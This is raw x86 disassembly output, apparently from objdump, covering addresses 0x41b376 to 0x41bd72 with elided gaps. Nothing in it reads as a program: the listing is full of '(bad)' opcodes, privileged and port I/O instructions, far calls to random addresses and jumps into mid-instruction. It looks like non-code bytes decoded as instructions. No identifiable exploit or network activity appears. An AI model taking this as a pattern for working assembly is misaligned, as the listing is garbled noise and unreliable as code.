  41b376:	mov    bl,0x52
  41b378:	xor    DWORD PTR [edi+0x5dc8474a],0xffffffd8
  41b37f:	xchg   ebp,eax
  41b380:	push   0xffffff8e
  41b382:	jbe    0x41b3fd
  41b384:	les    eax,FWORD PTR [ebx]
  41b386:	lods   ax,WORD PTR ds:[esi]
  41b388:	int3   
  41b389:	push   ebp
  41b38a:	xchg   edx,eax
  41b38b:	sub    eax,esp
  41b38d:	cmc    
  41b38e:	inc    esp
  41b38f:	push   DWORD PTR [ebx]
  41b391:	inc    ebp
  41b392:	popf   
  41b393:	jae    0x41b322
  41b395:	jno    0x41b411
  41b397:	jno    0x41b370
  41b399:	or     BYTE PTR [edi],cl
  41b39b:	out    0x54,al
  41b39d:	push   eax
  41b39e:	fwait
  41b39f:	sbb    esi,esp
  41b3a1:	pushf  
  41b3a2:	fiadd  WORD PTR [esi+0x5]
  41b3a5:	and    al,0x85
  41b3a7:	xor    ah,BYTE PTR [edi-0x686a98a8]
  41b3ad:	push   ss
  41b3ae:	cmp    BYTE PTR [eax+0x4c],ch
  41b3b1:	dec    ebx
  41b3b2:	xchg   esp,eax
  41b3b3:	lds    ebp,FWORD PTR [ecx-0x70]
  41b3b6:	cwde   
  41b3b7:	push   ecx
  41b3b8:	or     eax,0x25047f65
  41b3bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3be:	dec    esp
  41b3bf:	in     al,dx
  41b3c0:	adc    eax,DWORD PTR [eax]
	...
  41b432:	add    BYTE PTR [eax],al
  41b434:	mov    edi,0xff0fcf82
  41b439:	dec    edi
  41b43a:	push   DWORD PTR [edx-0x33ef3aa9]
  41b440:	js     0x41b489
  41b442:	fsub   st(7),st
  41b444:	mov    al,ds:0xf5000126
  41b449:	add    BYTE PTR [eax],al
  41b44b:	add    BYTE PTR [ebp+esi*2-0x75],bh
  41b44f:	sub    ah,BYTE PTR [eax]
  41b451:	pop    ebp
  41b452:	rol    BYTE PTR [eax],cl
  41b454:	test   DWORD PTR [edx],ebp
  41b456:	std    
  41b457:	jge    0x41b4c3
  41b459:	lds    edx,FWORD PTR [ecx-0x4a]
  41b45c:	fcomp  DWORD PTR [edx]
  41b45e:	mov    edx,DWORD PTR [ebp*1+0x57794261]
  41b465:	xor    bh,BYTE PTR [edx+esi*8]
  41b468:	push   0xffffff8f
  41b46a:	adc    al,ah
  41b46c:	sbb    edx,ecx
  41b46e:	cmp    al,0x71
  41b470:	daa    
  41b471:	mov    WORD PTR [ebx-0x60ac2690],fs
  41b477:	ss cmp al,ch
  41b47a:	faddp  st(6),st
  41b47c:	mov    ebx,0x57928a76
  41b481:	sub    eax,edi
  41b483:	jge    0x41b435
  41b485:	mov    esp,0x69e7fabe
  41b48a:	jmp    0x2564f4b1
  41b48f:	daa    
  41b490:	int    0x3a
  41b492:	mov    ah,0xcf
  41b494:	sbb    DWORD PTR [esi+0x4fb2ccba],eax
  41b49a:	mov    dl,0xac
  41b49c:	jecxz  0x41b45a
  41b49e:	push   esi
  41b49f:	mov    al,0x8c
  41b4a1:	pop    ebp
  41b4a2:	mov    ds:0x288ba715,eax
  41b4a7:	loope  0x41b4ff
  41b4a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4aa:	je     0x41b4f9
  41b4ac:	inc    ebx
  41b4ad:	inc    edx
  41b4ae:	pop    ebx
  41b4af:	mov    WORD PTR [ecx+edx*2],cs
  41b4b2:	pop    es
  41b4b3:	mov    bh,0x37
  41b4b5:	popf   
  41b4b6:	or     bl,BYTE PTR [ebp-0x5f]
  41b4b9:	mov    ah,0x7b
  41b4bb:	clc    
  41b4bc:	scas   eax,DWORD PTR es:[edi]
  41b4bd:	bound  ebp,QWORD PTR [edx-0x696cd590]
  41b4c3:	dec    ebx
  41b4c4:	loopne 0x41b531
  41b4c6:	xchg   ebp,esi
  41b4c8:	mov    edi,0x48db911b
  41b4cd:	sahf   
  41b4ce:	mov    eax,ds:0xa438cf7e
  41b4d3:	test   al,0xf9
  41b4d5:	jmp    0xc4a0485
  41b4da:	ins    BYTE PTR es:[edi],dx
  41b4db:	mov    al,0x8b
  41b4dd:	mov    ds:0x2b441aa7,al
  41b4e2:	jb     0x41b4a4
  41b4e4:	fbstp  TBYTE PTR [ebp+eiz*8-0x35]
  41b4e8:	imul   ebx,DWORD PTR [edx-0x467a85ec],0xffffffc3
  41b4ef:	cmc    
  41b4f0:	push   0xffffffdf
  41b4f2:	push   ecx
  41b4f3:	pop    edx
  41b4f4:	shl    edx,1
  41b4f6:	mov    bh,0xb3
  41b4f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4f9:	mov    WORD PTR ds:0x8073329d,?
  41b4ff:	dec    ecx
  41b500:	inc    edx
  41b501:	xor    eax,0xf467cb6c
  41b506:	and    edi,DWORD PTR [eax+0x27]
  41b509:	aaa    
  41b50a:	pop    ebx
  41b50b:	add    dh,ch
  41b50d:	xor    dl,BYTE PTR [esi]
  41b50f:	int3   
  41b510:	daa    
  41b511:	and    esi,ebx
  41b513:	or     al,BYTE PTR [ecx+0x73583a8c]
  41b519:	mov    bh,0xc7
  41b51b:	push   cs
  41b51c:	into   
  41b51d:	pop    edi
  41b51e:	loop   0x41b4d7
  41b520:	cld    
  41b521:	cmp    eax,0x7a505d5b
  41b526:	or     eax,0x17213d77
  41b52b:	sbb    al,0x7f
  41b52d:	in     eax,0xa
  41b52f:	dec    ebp
  41b530:	pop    ebp
  41b531:	sar    BYTE PTR [edi+edi*8],0x41
  41b535:	div    BYTE PTR [ecx-0xa]
  41b538:	das    
  41b539:	bts    DWORD PTR [edi-0xd56e149],esp
  41b540:	xlat   BYTE PTR ds:[ebx]
	...
  41b5b1:	add    BYTE PTR [eax],al
  41b5b3:	add    BYTE PTR [edx+ebp*1+0x1],bl
  41b5b7:	inc    ecx
  41b5b8:	ja     0x41b625
  41b5ba:	pop    esp
  41b5bb:	aas    
  41b5bc:	pop    ecx
  41b5bd:	pop    esi
  41b5be:	inc    eax
  41b5bf:	adc    al,0x80
  41b5c1:	mov    ah,0x92
  41b5c3:	mov    cl,0x95
  41b5c5:	daa    
  41b5c6:	add    DWORD PTR [eax],eax
  41b5c8:	cmc    
  41b5c9:	add    BYTE PTR [eax],al
  41b5cb:	add    BYTE PTR [esi-0x13],bl
  41b5ce:	pop    ebx
  41b5cf:	fld    QWORD PTR [esi]
  41b5d1:	mov    ebp,0x9b12e115
  41b5d6:	push   0xffffff8a
  41b5d8:	xchg   ecx,eax
  41b5d9:	xchg   ebp,eax
  41b5da:	(bad)  
  41b5dc:	xlat   BYTE PTR ds:[ebx]
  41b5dd:	xchg   edi,eax
  41b5de:	dec    ebx
  41b5df:	scas   al,BYTE PTR es:[edi]
  41b5e0:	ror    DWORD PTR ss:[ebx-0x64],0x1b
  41b5e5:	lods   al,BYTE PTR ds:[esi]
  41b5e6:	sti    
  41b5e7:	fisttp WORD PTR [edi+0x699de5e0]
  41b5ed:	stos   DWORD PTR es:[edi],eax
  41b5ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5ef:	sub    eax,0x93457acb
  41b5f4:	inc    eax
  41b5f5:	test   BYTE PTR [esi],al
  41b5f7:	scas   al,BYTE PTR es:[edi]
  41b5f8:	cmp    DWORD PTR [ebp-0x71],ecx
  41b5fb:	and    eax,0x96fea9f1
  41b600:	scas   al,BYTE PTR es:[edi]
  41b601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b602:	(bad)  
  41b603:	cs push edi
  41b605:	shl    DWORD PTR [esi],1
  41b607:	das    
  41b608:	stos   DWORD PTR es:[edi],eax
  41b609:	mov    ds:0x989eb85f,eax
  41b60e:	in     eax,dx
  41b60f:	mov    bh,0xb5
  41b611:	xor    al,0x3
  41b613:	cmp    eax,0x855ce3c5
  41b618:	call   0x78678fe9
  41b61d:	add    al,0xab
  41b61f:	mov    dl,0x2d
  41b621:	in     al,0xef
  41b623:	jle    0x41b664
  41b625:	add    al,0x70
  41b627:	iret   
  41b628:	je     0x41b5d5
  41b62a:	loop   0x41b665
  41b62c:	push   edi
  41b62d:	nop
  41b62e:	loope  0x41b5e5
  41b630:	fld    QWORD PTR [edx]
  41b632:	xor    esi,esi
  41b634:	sti    
  41b635:	cmp    edx,esi
  41b637:	add    BYTE PTR [edi],bh
  41b639:	xchg   edi,eax
  41b63a:	icebp  
  41b63b:	pop    edi
  41b63c:	cld    
  41b63d:	enter  0x2366,0xb4
  41b641:	aaa    
  41b642:	xor    ecx,DWORD PTR ds:0xe9f05a91
  41b648:	dec    esp
  41b649:	mov    al,0xa8
  41b64b:	lds    ecx,FWORD PTR [esi+0x53]
  41b64e:	stos   DWORD PTR es:[edi],eax
  41b64f:	xchg   esp,eax
  41b650:	mov    dh,0x1f
  41b652:	xchg   ecx,eax
  41b653:	test   dl,dl
  41b655:	xchg   esp,eax
  41b656:	adc    dl,ah
  41b658:	or     BYTE PTR [ecx+0x25e9af6b],al
  41b65e:	adc    al,0x50
  41b660:	scas   eax,DWORD PTR es:[edi]
  41b661:	pop    edi
  41b662:	test   al,0xb9
  41b664:	aam    0x4
  41b666:	in     eax,0xcd
  41b668:	test   DWORD PTR [eax+0x4e6b28de],edi
  41b66e:	xchg   edx,eax
  41b66f:	jge    0x41b685
  41b671:	bswap  eax
  41b673:	mov    ebx,0xaf322bc8
  41b678:	mov    DWORD PTR [ecx],eax
  41b67a:	xor    BYTE PTR ds:0x152d3a1f,ch
  41b680:	xor    ch,BYTE PTR [ecx]
  41b682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b683:	sub    ch,BYTE PTR [ebx-0x4f851c3c]
  41b689:	arpl   WORD PTR [eax+0x67226bfb],sp
  41b68f:	loopne 0x41b6f7
  41b691:	xchg   edx,eax
  41b692:	sub    al,0xce
  41b694:	jae    0x41b70e
  41b696:	sub    BYTE PTR [edx-0x27],bh
  41b699:	addr16 jns 0x41b67e
  41b69c:	xchg   BYTE PTR [esi],bh
  41b69e:	nop
  41b69f:	neg    DWORD PTR [edx-0x6f]
  41b6a2:	add    eax,0x6e140896
  41b6a7:	aad    0x61
  41b6a9:	pop    esp
  41b6aa:	sub    eax,0x87bf0728
  41b6af:	sti    
  41b6b0:	clc    
  41b6b1:	xchg   esp,eax
  41b6b2:	xor    DWORD PTR [esp+ecx*1-0x6f2d3322],esp
  41b6b9:	inc    eax
  41b6ba:	jle    0x41b723
  41b6bc:	aas    
  41b6bd:	je     0x41b6c5
  41b6bf:	aaa    
  41b6c0:	popa   
	...
  41b731:	add    BYTE PTR [eax],al
  41b733:	add    bl,dh
  41b735:	xchg   edi,eax
  41b736:	jae    0x41b6bf
  41b738:	ja     0x41b721
  41b73a:	div    edi
  41b73c:	dec    eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	push   es
  41b73f:	mov    cl,al
  41b741:	pop    ecx
  41b742:	hlt    
  41b743:	nop
  41b744:	mov    ch,BYTE PTR [eax]
  41b746:	add    DWORD PTR [eax],eax
  41b748:	cmc    
  41b749:	add    BYTE PTR [eax],al
  41b74b:	add    BYTE PTR [ebx],bl
  41b74d:	test   DWORD PTR [ebx+esi*2],ebx
  41b750:	sbb    DWORD PTR [edi-0x5fa3f64c],ebx
  41b756:	inc    edx
  41b757:	xchg   edi,edx
  41b759:	xchg   BYTE PTR [eax],bh
  41b75b:	retf   0xe75c
  41b75e:	mov    bl,0x59
  41b760:	adc    al,BYTE PTR [ebp+0x29]
  41b763:	sbb    eax,0xf37162d
  41b768:	mov    al,ds:0xade3df94
  41b76d:	dec    eax
  41b76e:	add    BYTE PTR ds:0x2d76bf43,bh
  41b774:	ins    DWORD PTR es:[edi],dx
  41b775:	shl    BYTE PTR [eax+0x75922ea5],0xdc
  41b77c:	hlt    
  41b77d:	shl    ch,cl
  41b77f:	fdiv   st,st(3)
  41b781:	cmp    esi,eax
  41b783:	lds    eax,FWORD PTR [edi-0x2e]
  41b786:	ret    
  41b787:	xor    eax,0x7b455652
  41b78c:	and    eax,0x2f4ff959
  41b791:	lods   eax,DWORD PTR ds:[esi]
  41b792:	pop    ss
  41b793:	inc    ecx
  41b794:	sahf   
  41b795:	popf   
  41b796:	push   ebp
  41b797:	jae    0x41b806
  41b799:	add    ah,BYTE PTR [eax-0x3577e1a2]
  41b79f:	stos   BYTE PTR es:[edi],al
  41b7a0:	in     eax,0x5e
  41b7a2:	ror    BYTE PTR [edx+0x76],1
  41b7a5:	lods   al,BYTE PTR ds:[esi]
  41b7a6:	cld    
  41b7a7:	cmp    al,0x0
  41b7a9:	test   WORD PTR [edi+0x63b7c869],0x6df4
  41b7b2:	fwait
  41b7b3:	test   edi,eax
  41b7b5:	and    ebx,DWORD PTR [edi+0x14]
  41b7b8:	jecxz  0x41b7ff
  41b7ba:	adc    ecx,ebx
  41b7bc:	in     al,dx
  41b7bd:	cmp    BYTE PTR [esi+eax*4],al
  41b7c0:	or     eax,0xa0200182
  41b7c5:	(bad)  
  41b7c6:	mov    ds:0xeadcfbe5,eax
  41b7cb:	add    eax,DWORD PTR [esi]
  41b7cd:	sti    
  41b7ce:	test   edx,ebp
  41b7d0:	jne    0x41b82f
  41b7d2:	xchg   edx,eax
  41b7d3:	jo     0x41b7da
  41b7d5:	aaa    
  41b7d6:	sar    al,cl
  41b7d8:	jne    0x41b78c
  41b7da:	mov    WORD PTR [ecx-0x733c0c6],cs
  41b7e0:	mov    dh,BYTE PTR [esi]
  41b7e2:	in     eax,0x8a
  41b7e4:	stos   BYTE PTR es:[edi],al
  41b7e5:	push   esi
  41b7e6:	ds das 
  41b7e8:	(bad)  
  41b7e9:	sub    esp,DWORD PTR [ebp+0x26]
  41b7ec:	inc    edi
  41b7ed:	lea    edx,ds:0x72312e8b
  41b7f3:	retf   0x7687
  41b7f6:	(bad)  
  41b7f7:	xchg   esi,eax
  41b7f8:	call   0x6f89:0x8ad79452
  41b7ff:	xchg   ecx,eax
  41b800:	jb     0x41b85a
  41b802:	mov    edi,0xd2332c29
  41b807:	outs   dx,BYTE PTR ds:[esi]
  41b808:	mov    edi,0x573d1c53
  41b80d:	or     al,0x2
  41b80f:	test   ecx,esp
  41b811:	lock icebp 
  41b813:	aaa    
  41b814:	dec    edx
  41b815:	fsubp  st(6),st
  41b817:	cmp    bh,BYTE PTR [ecx-0x7b974197]
  41b81d:	in     eax,dx
  41b81e:	aam    0x76
  41b820:	mov    ds:0x4d4b4747,al
  41b825:	mov    ds:0x601478e,eax
  41b82a:	dec    esp
  41b82b:	push   ebx
  41b82c:	sub    cl,BYTE PTR [edx-0x2a]
  41b82f:	lods   eax,DWORD PTR ds:[esi]
  41b830:	and    BYTE PTR [edx+0x11],cl
  41b833:	scas   al,BYTE PTR es:[edi]
  41b834:	je     0x41b833
  41b836:	jae    0x41b810
  41b838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b839:	push   ecx
  41b83a:	xchg   esp,eax
  41b83b:	inc    ebx
  41b83c:	mov    WORD PTR [ecx+0xabe246],?
	...
  41b8b2:	add    BYTE PTR [eax],al
  41b8b4:	xor    eax,0xcf4a867e
  41b8b9:	cli    
  41b8ba:	std    
  41b8bb:	jg     0x41b85c
  41b8bd:	into   
  41b8be:	jno    0x41b916
  41b8c0:	(bad)  
  41b8c1:	fstp   QWORD PTR [ebx+0x51]
  41b8c4:	jg     0x41b8ef
  41b8c6:	add    DWORD PTR [eax],eax
  41b8c8:	cmc    
  41b8c9:	add    BYTE PTR [eax],al
  41b8cb:	add    BYTE PTR [ecx-0x35],dh
  41b8ce:	aad    0xda
  41b8d0:	jecxz  0x41b91f
  41b8d2:	inc    edi
  41b8d3:	push   ds
  41b8d4:	test   al,0xf8
  41b8d6:	cmp    DWORD PTR [eax+0x8c9c602],esi
  41b8dc:	jge    0x41b959
  41b8de:	pop    es
  41b8df:	mov    BYTE PTR [esi],ah
  41b8e1:	push   0xffffffb0
  41b8e3:	adc    bl,BYTE PTR [esi+0x76]
  41b8e6:	dec    edx
  41b8e7:	in     eax,0x43
  41b8e9:	stos   DWORD PTR es:[edi],eax
  41b8ea:	ja     0x41b94d
  41b8ec:	push   eax
  41b8ed:	repnz sub esp,edx
  41b8f0:	out    dx,al
  41b8f1:	jne    0x41b91e
  41b8f3:	cdq    
  41b8f4:	push   0x30
  41b8f6:	sub    eax,0xa6873fb1
  41b8fb:	in     al,dx
  41b8fc:	aad    0x93
  41b8fe:	push   ecx
  41b8ff:	(bad)  
  41b900:	jb     0x41b895
  41b902:	push   edi
  41b903:	jns    0x41b89d
  41b905:	sub    BYTE PTR [ebp-0x22],ah
  41b908:	push   ebp
  41b909:	(bad)  
  41b90a:	repnz cli 
  41b90c:	pop    edx
  41b90d:	pop    ss
  41b90e:	int    0x98
  41b910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b911:	es jno 0x41b944
  41b914:	add    DWORD PTR [ebx],ebx
  41b916:	(bad)  [esi]
  41b918:	mov    dh,0x4
  41b91a:	out    dx,al
  41b91b:	push   0x6cce4348
  41b920:	pop    eax
  41b921:	cmc    
  41b922:	or     eax,0x745739f3
  41b927:	imul   BYTE PTR [edx-0x3fa56e2b]
  41b92d:	or     ecx,DWORD PTR [ebx+0x10]
  41b930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b931:	repz jnp 0x41b92b
  41b934:	stos   DWORD PTR es:[edi],eax
  41b935:	sub    DWORD PTR [ecx+0x7f5453f5],ecx
  41b93b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b93c:	pop    ds
  41b93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b93e:	jns    0x41b929
  41b940:	ins    DWORD PTR es:[edi],dx
  41b941:	rcr    DWORD PTR [edi+0x2452bf48],1
  41b947:	fdiv   st,st(0)
  41b949:	push   esi
  41b94a:	cwde   
  41b94b:	mov    ch,0xf3
  41b94d:	push   eax
  41b94e:	jp     0x41b95e
  41b950:	xor    al,0x3a
  41b952:	dec    ecx
  41b953:	(bad)  
  41b954:	out    dx,eax
  41b955:	fs mov esi,0xa36a4a3a
  41b95b:	cmc    
  41b95c:	out    0xa3,al
  41b95e:	cmp    dl,BYTE PTR [esi-0x4771efa]
  41b964:	sahf   
  41b965:	retf   
  41b966:	test   DWORD PTR [ebp-0x39921048],ecx
  41b96c:	(bad)  
  41b96d:	outs   dx,DWORD PTR ds:[esi]
  41b96e:	test   DWORD PTR [ecx+0x12],ebx
  41b971:	mov    BYTE PTR [ecx],0x7d
  41b974:	iret   
  41b975:	iret   
  41b976:	sub    edi,DWORD PTR gs:[ebp+0x281d64d2]
  41b97d:	add    al,0x8b
  41b97f:	mov    DWORD PTR [esi],ebp
  41b981:	int3   
  41b982:	add    al,0xbb
  41b984:	dec    ecx
  41b985:	loopne 0x41ba01
  41b987:	inc    ebx
  41b988:	cmp    edx,ebp
  41b98a:	fcom   DWORD PTR [ebp+0x1007aedf]
  41b990:	sub    ah,BYTE PTR [ebp+0x22e11e9d]
  41b996:	jg     0x41b977
  41b998:	jne    0x41b9dd
  41b99a:	dec    ebp
  41b99b:	mov    BYTE PTR [eax],dl
  41b99d:	sub    dl,BYTE PTR [ebp+0x1025bead]
  41b9a3:	inc    ecx
  41b9a4:	mov    esp,0x58ca99c8
  41b9a9:	out    0x39,eax
  41b9ab:	test   BYTE PTR [edx],ah
  41b9ad:	jns    0x41b9d7
  41b9af:	das    
  41b9b0:	mov    dh,0x62
  41b9b2:	jae    0x41b9b8
  41b9b4:	pop    es
  41b9b5:	dec    ecx
  41b9b6:	cmp    edi,DWORD PTR [edx-0x5b0240b4]
  41b9bc:	inc    edx
  41b9bd:	and    BYTE PTR [ebx+0x705d],ch
	...
  41ba33:	add    bh,dh
  41ba35:	add    esp,ebx
  41ba37:	mov    ah,0xfe
  41ba39:	std    
  41ba3a:	inc    DWORD PTR [ebx-0x11]
  41ba3d:	sub    ecx,DWORD PTR [edx]
  41ba3f:	pop    edi
  41ba40:	push   ds
  41ba41:	mov    ah,0xa7
  41ba43:	xor    DWORD PTR [edx+ebp*1+0x1],0x0
  41ba48:	cmc    
  41ba49:	add    BYTE PTR [eax],al
  41ba4b:	add    BYTE PTR [ecx],cl
  41ba4d:	into   
  41ba4e:	mov    ds:0x35d42ec4,al
  41ba53:	sbb    al,0xe9
  41ba56:	in     al,0xac
  41ba58:	pop    ebx
  41ba59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba5a:	sbb    dl,dh
  41ba5c:	data16 arpl WORD PTR [edi-0x64],si
  41ba60:	test   DWORD PTR [esi-0x64d75cd0],esp
  41ba66:	add    ebp,ebp
  41ba68:	adc    ah,bl
  41ba6a:	mov    ds:0xd24cea3c,al
  41ba6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba70:	int3   
  41ba71:	ja     0x41ba25
  41ba73:	sub    DWORD PTR [edx-0x67],0x7f20bed4
  41ba7a:	dec    edi
  41ba7b:	das    
  41ba7c:	clc    
  41ba7d:	inc    ebx
  41ba7e:	or     DWORD PTR [ebx-0x768c4976],edx
  41ba84:	sahf   
  41ba85:	(bad)
  41ba88:	mov    bl,0x11
  41ba8a:	addr16 sbb esp,edx
  41ba8d:	in     al,dx
  41ba8e:	dec    esi
  41ba8f:	jns    0x41bad5
  41ba91:	adc    al,0x80
  41ba93:	ins    BYTE PTR es:[edi],dx
  41ba94:	adc    al,0x24
  41ba96:	test   BYTE PTR [esi-0x4fe714a],bh
  41ba9c:	pop    ds
  41ba9d:	mov    eax,ebp
  41ba9f:	lea    ebx,[ebp+0x4e]
  41baa2:	jp     0x41ba50
  41baa4:	ret    
  41baa5:	jbe    0x41bac7
  41baa7:	ja     0x41baa8
  41baa9:	inc    BYTE PTR [edi-0x7e11cc29]
  41baaf:	xchg   edi,eax
  41bab0:	cmp    edx,DWORD PTR [ebp-0x226db0f]
  41bab6:	mov    edi,esi
  41bab8:	mov    edi,0xeff5729
  41babd:	test   DWORD PTR [edx+0x76ff410d],eax
  41bac3:	add    DWORD PTR [ebp+0x1ce35cd6],ebx
  41bac9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41baca:	out    dx,eax
  41bacb:	xor    DWORD PTR [esi],0xd317d190
  41bad1:	xchg   ecx,eax
  41bad2:	fwait
  41bad3:	mov    ebx,0xbf364a2f
  41bad8:	int3   
  41bad9:	lods   al,BYTE PTR ds:[esi]
  41bada:	xchg   esp,eax
  41badb:	data16 aaa 
  41badd:	sti    
  41bade:	sub    eax,0x220862f4
  41bae3:	dec    eax
  41bae4:	jno    0x41bb5c
  41bae6:	push   ds
  41bae7:	xchg   edx,eax
  41bae8:	repz aam 0x2a
  41baeb:	in     eax,0xc9
  41baed:	mov    ds:0x10b343e,eax
  41baf2:	cwde   
  41baf3:	lods   al,BYTE PTR ds:[esi]
  41baf4:	mov    ebx,0x314bbe6c
  41baf9:	rcr    edx,0x44
  41bafc:	cmp    esi,DWORD PTR [ebp-0x57ef9ddf]
  41bb02:	call   0x5e19:0x78d61850
  41bb09:	mov    edx,0x5ae54fce
  41bb0e:	adc    eax,0x176cc9ff
  41bb13:	pop    edx
  41bb14:	iret   
  41bb15:	rcr    DWORD PTR [ebp+ecx*4+0x2d7735af],0x22
  41bb1d:	cmp    al,0x6c
  41bb1f:	pushf  
  41bb20:	add    ecx,DWORD PTR [eax+0x49]
  41bb23:	mov    ebp,0xfa29a95c
  41bb28:	jg     0x41baae
  41bb2a:	mov    ah,0x91
  41bb2c:	arpl   bx,si
  41bb2e:	pop    ss
  41bb2f:	ret    
  41bb30:	stc    
  41bb31:	rol    al,cl
  41bb33:	test   ah,ch
  41bb35:	daa    
  41bb36:	sbb    eax,0x918ec92a
  41bb3b:	sbb    cl,BYTE PTR [ecx-0x64]
  41bb3e:	pushf  
  41bb3f:	sbb    DWORD PTR [eax+0x0],ebx
	...
  41bbb1:	add    BYTE PTR [eax],al
  41bbb3:	add    BYTE PTR [edx+0x49],ch
  41bbb6:	es cmp al,0x27
  41bbb9:	jg     0x41bc35
  41bbbb:	pop    edi
  41bbbc:	xor    DWORD PTR [edx+edi*2],0x3a
  41bbc0:	inc    esi
  41bbc1:	jo     0x41bc13
  41bbc3:	pop    esp
  41bbc4:	imul   ebp,DWORD PTR [ebx],0xf50001
  41bbca:	add    BYTE PTR [eax],al
  41bbcc:	cli    
  41bbcd:	dec    ebp
  41bbce:	sub    BYTE PTR [edx],ch
  41bbd0:	(bad)  
  41bbd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbd2:	hlt    
  41bbd3:	ja     0x41bc0e
  41bbd5:	pop    ebp
  41bbd6:	inc    esp
  41bbd7:	dec    eax
  41bbd8:	mov    al,ds:0x36115079
  41bbdd:	sub    edx,DWORD PTR [ebp-0x8]
  41bbe0:	scas   al,BYTE PTR es:[edi]
  41bbe1:	and    DWORD PTR [ebp-0x3c],ecx
  41bbe4:	jb     0x41bba4
  41bbe6:	adc    al,0xe
  41bbe8:	out    dx,eax
  41bbe9:	(bad)  
  41bbea:	(bad)  
  41bbeb:	(bad)  
  41bbec:	mov    esp,0xae7d2187
  41bbf1:	aas    
  41bbf2:	xor    eax,0x1f63bc74
  41bbf7:	fsubr  QWORD PTR [ecx+0x3f37d4db]
  41bbfd:	inc    ecx
  41bbfe:	mov    ds:0xc0559db3,al
  41bc03:	adc    bl,ch
  41bc05:	jmp    0x41bb89
  41bc07:	xor    ah,ch
  41bc09:	ss or  ch,ah
  41bc0c:	test   eax,0x5b3e8a44
  41bc11:	pop    esi
  41bc12:	popf   
  41bc13:	ficomp DWORD PTR [esi+0x6e88a38a]
  41bc19:	ret    
  41bc1a:	sub    ch,BYTE PTR [eax]
  41bc1c:	add    eax,0xe22f6679
  41bc21:	shl    BYTE PTR [esi-0x42],1
  41bc24:	(bad)  
  41bc25:	int3   
  41bc26:	pop    ebp
  41bc27:	repz add al,0xf5
  41bc2a:	jge    0x41bbfb
  41bc2c:	xor    esi,DWORD PTR [esi]
  41bc2e:	jae    0x41bc71
  41bc30:	or     eax,0x34ace740
  41bc35:	jecxz  0x41bbc8
  41bc37:	push   edx
  41bc38:	out    dx,al
  41bc39:	retf   
  41bc3a:	mov    al,ds:0xcbc00962
  41bc3f:	or     eax,0xc4380d37
  41bc44:	adc    al,0xa2
  41bc46:	and    ebx,DWORD PTR [esi+edx*4-0x2a]
  41bc4a:	add    dl,BYTE PTR [ebx+0x4e1942ef]
  41bc50:	cmp    al,0xa1
  41bc52:	shr    BYTE PTR [ebp-0x7c],cl
  41bc55:	jle    0x41bcb5
  41bc57:	and    bh,ah
  41bc59:	cld    
  41bc5a:	sar    DWORD PTR [eax],0x20
  41bc5d:	pop    es
  41bc5e:	xchg   edx,eax
  41bc5f:	fld    TBYTE PTR cs:[ecx]
  41bc62:	jl     0x41bc63
  41bc64:	mov    ecx,0x1712942a
  41bc69:	inc    esp
  41bc6a:	gs dec edx
  41bc6c:	(bad)  
  41bc6d:	scas   al,BYTE PTR es:[edi]
  41bc6e:	push   ecx
  41bc6f:	cmp    dl,dh
  41bc71:	jno    0x41bbf7
  41bc73:	out    0x9e,al
  41bc75:	push   ss
  41bc76:	jecxz  0x41bc3c
  41bc78:	pop    DWORD PTR [eax-0x25]
  41bc7b:	add    cl,BYTE PTR [edx-0x3eff9456]
  41bc81:	outs   dx,DWORD PTR ds:[esi]
  41bc82:	pop    ebp
  41bc83:	clc    
  41bc84:	stc    
  41bc85:	mov    ss,edx
  41bc87:	jmp    0x41bce4
  41bc89:	mov    dl,0xc4
  41bc8b:	inc    ebp
  41bc8c:	data16 cmp ah,dh
  41bc8f:	push   0xffffffd5
  41bc91:	test   eax,0x1cb440e2
  41bc96:	mov    eax,ds:0xecab39b6
  41bc9b:	in     al,dx
  41bc9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc9d:	(bad)  
  41bc9e:	aas    
  41bc9f:	lods   al,BYTE PTR ds:[esi]
  41bca0:	in     eax,dx
  41bca1:	mov    eax,ds:0x1138f4f6
  41bca6:	push   ds
  41bca7:	cli    
  41bca8:	cmp    eax,0x233d4778
  41bcad:	retf   
  41bcae:	xchg   ecx,eax
  41bcaf:	xchg   ebp,eax
  41bcb0:	arpl   WORD PTR [edx+0x45baa573],dx
  41bcb6:	and    bh,dl
  41bcb8:	mov    BYTE PTR [edi+0x47],al
  41bcbb:	sbb    bh,BYTE PTR [edx-0x71b26d17]
	...
  41bd31:	add    BYTE PTR [eax],al
  41bd33:	add    BYTE PTR [ebp-0x8],dl
  41bd36:	or     DWORD PTR [esi-0x4280053],ebx
  41bd3c:	cmp    eax,0xc2bf1c9a
  41bd41:	mov    eax,DWORD PTR [ebp+0x12c5e78]
  41bd47:	add    ch,dh
  41bd49:	add    BYTE PTR [eax],al
  41bd4b:	add    BYTE PTR [ebp+ebp*8+0x2c6a9b1e],ch
  41bd52:	mov    eax,ds:0x7bfd6ec6
  41bd57:	jns    0x41bd8b
  41bd59:	push   esi
  41bd5a:	pop    esp
  41bd5b:	push   eax
  41bd5c:	cli    
  41bd5d:	ret    
  41bd5e:	dec    eax
  41bd5f:	adc    ah,BYTE PTR [eax]
  41bd61:	test   DWORD PTR [edx+0xb],ecx
  41bd64:	(bad)  
  41bd65:	in     eax,dx
  41bd66:	sti    
  41bd67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd68:	cwde   
  41bd69:	mov    al,0x62
  41bd6b:	test   al,0xba
  41bd6d:	js     0x41bdde
  41bd6f:	dec    eax
  41bd70:	clc    
  41bd71:	push   cs
  41bd72:	mov    eax,0x2f03edf2
